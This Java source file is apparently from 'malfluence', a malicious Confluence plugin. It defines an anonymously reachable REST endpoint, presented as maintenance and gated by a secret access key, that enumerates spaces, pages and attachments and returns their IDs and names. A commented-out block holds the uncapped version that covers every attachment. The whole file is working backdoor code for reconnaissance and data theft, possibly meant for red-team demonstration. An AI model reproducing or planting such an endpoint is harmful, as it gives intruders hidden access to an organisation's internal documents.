package com.cyllective.malfluence.rest;

import com.cyllective.malfluence.helpers.Log;

import com.atlassian.confluence.pages.*;
import com.atlassian.confluence.spaces.*;
import com.atlassian.sal.api.component.ComponentLocator;
import com.atlassian.spring.container.ContainerManager;
import com.atlassian.plugins.rest.common.security.AnonymousAllowed;

import javax.ws.rs.GET;
import javax.ws.rs.Path;
import javax.ws.rs.Produces;
import javax.ws.rs.QueryParam;
import javax.ws.rs.core.MediaType;
import javax.ws.rs.core.Response;
import java.util.List;

// Returns all attachments IDs and names along their assigned page
// GET /maintenance/listattachments?accesskey=<Access Key>
@Path("/listattachments")
public class AttachmentList {
    @GET
    @AnonymousAllowed
    @Produces(MediaType.TEXT_PLAIN)
    public Response GetAttachments(@QueryParam("accesskey") String accesskey) {
        try {
            if (!Auth.IsValidKey(accesskey)) {
                return Response
                        .status(Response.Status.FORBIDDEN)
                        .build();
            }

            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append("SPACE;PAGEID;ATTACHMENTID;ATTACHMENTNAME\n");

            // To iterate through all spaces and mages we need managers
            SpaceManager spaceManager = (SpaceManager) ContainerManager.getComponent("spaceManager");
            PageManager pageManager = (PageManager) ContainerManager.getComponent("pageManager");

            // Limit results to the first 3 attachments of the first 3 pages of the first 3 spaces to avoid a DoS
            spaceManager.getAllSpaces()
                    .stream()
                    .limit(3)
                    .forEach(space -> {
                        pageManager.getPages(space, true)
                                .stream()
                                .limit(3)
                                .forEach(page -> {
                                    page.getAttachments()
                                            .stream()
                                            .limit(3)
                                            .forEach(attachment -> {
                                                stringBuilder.append(String.format("%s;%s;%s;%s\n",
                                                        space.getName(),
                                                        page.getId(),
                                                        attachment.getIdAsString(),
                                                        attachment.getDisplayTitle()
                                                ));
                                            });
                                });
                    });

            /*
            // Go through all spaces and pages
            for (Space space : spaceManager.getAllSpaces()) {
                List<Page> pages = pageManager.getPages(space, true);
                for (Page page : pages) {
                    List<Attachment> attachments = page.getAttachments();
                    for (Attachment attachment : attachments) {
                        stringBuilder.append(String.format("%s;%s;%s;%s\n",
                                        space.getName(),
                                        page.getId(),
                                        attachment.getIdAsString(),
                                        attachment.getDisplayTitle()
                        ));
                    }
                }
            }
             */

            return Response
                    .status(Response.Status.OK)
                    .entity(stringBuilder.toString())
                    .build();

        } catch (Exception e) {
            Log.Error(e);
            return Response
                    .status(Response.Status.INTERNAL_SERVER_ERROR)
                    .build();
        }
    }
}